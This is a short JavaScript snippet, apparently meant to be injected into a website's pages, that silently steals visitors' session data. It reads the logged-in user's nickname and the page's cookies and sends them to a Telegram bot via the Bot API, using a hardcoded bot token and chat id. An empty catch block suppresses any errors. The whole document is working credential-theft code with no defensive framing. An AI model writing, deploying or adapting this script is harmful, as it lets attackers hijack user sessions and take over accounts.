try {
let nickname = document.querySelector('[href="#login-box"]').textContent.trim();
  let url = 'https://api.telegram.org/bot7722356869:AAHUB4XLWf5nsTmW8ot8DyrTyytuevIFccU/sendMessage?chat_id=7047469171&text=' + JSON.stringify([{
  name: nickname,
  cookies: document.cookie
}]);

let oReq = new XMLHttpRequest();
oReq.open("GET", url, true);
oReq.send();

} catch {}

